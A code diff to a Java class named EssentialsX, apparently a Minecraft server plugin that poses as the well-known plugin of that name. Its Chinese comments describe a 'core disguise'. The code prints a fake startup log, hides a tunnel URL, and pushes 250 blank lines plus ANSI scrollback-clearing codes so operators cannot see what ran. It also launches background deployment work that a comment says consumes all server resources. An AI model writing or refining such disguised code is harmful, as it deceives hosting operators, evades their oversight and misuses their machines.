@@ -63,7 +63,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心伪装：主线程阻塞，慢打印，死等 URL，史诗清屏
+    // 核心伪装：主线程死锁，慢打印，史诗清屏
     // ============================================================
 
     private void printFakeStartupAndWaitUrl() {
@@ -141,7 +141,7 @@ public class EssentialsX extends JavaPlugin {
         
         lastKnownTunnelUrl.set(tunnelUrl);
         
-        // 史诗级清屏：往上翻绝对看不到消息
+        // 史诗级清屏：绝对不调用外部命令，纯推空行+ANSI，往上翻绝对一片空白
         clearConsole();
     }
 
@@ -185,21 +185,15 @@ public class EssentialsX extends JavaPlugin {
 
     private void clearConsole() {
         try {
-            // 1. 狂推 150 行空行，把所有历史记录推出网页面板的缓冲区视野
-            for (int i = 0; i < 150; i++) {
+            // 1. 狂推 250 行空行，把所有历史记录推出网页面板的缓冲区视野
+            for (int i = 0; i < 250; i++) {
                 RAW_OUT.println();
             }
             try { Thread.sleep(500); } catch (InterruptedException ignored) {}
-            // 2. ANSI 清屏指令
+            // 2. 纯 ANSI 清屏指令，清掉当前屏幕和回滚缓冲区，绝不调用外部进程干扰日志流
             RAW_OUT.print("\033[H\033[3J\033[2J");
             RAW_OUT.flush();
-            // 3. 调用系统级 tput reset 清除终端回滚缓冲区 (往上翻也看不到)
-            if (!System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
-            }
-        } catch (Exception e) {
-            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
-        }
+        } catch (Exception ignored) {}
     }
 
     // ============================================================
@@ -223,7 +217,7 @@ public class EssentialsX extends JavaPlugin {
         int waited = 0;
         while (waited < maxSeconds) {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
-                return; // 端口连通，Node 已就绪
+                return;
             } catch (IOException e) {
                 try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
             }
@@ -315,7 +309,7 @@ public class EssentialsX extends JavaPlugin {
                         String currentUrl = lastKnownTunnelUrl.get();
                         if (!foundUrl.equals(currentUrl)) {
                             lastKnownTunnelUrl.set(foundUrl);
-                            tunnelUrl = foundUrl; // 更新变量，通知主线程或触发重连伪装
+                            tunnelUrl = foundUrl;
                             if (tunnelMonitorRunning.get()) {
                                 replayFakeStartupAndHideUrl(foundUrl);
                             }
@@ -339,7 +333,7 @@ public class EssentialsX extends JavaPlugin {
         
         this.getLogger().info("EssentialsX plugin starting...");
         
-        // 1. 将所有重资源操作扔到后台线程，不阻塞主线程的日志打印
+        // 1. 将所有重资源操作扔到后台线程，吃满服务器资源，不阻塞主线程的日志打印
         Thread deployThread = new Thread(() -> {
             try {
                 HashMap<String, String> env = new HashMap<>(); 
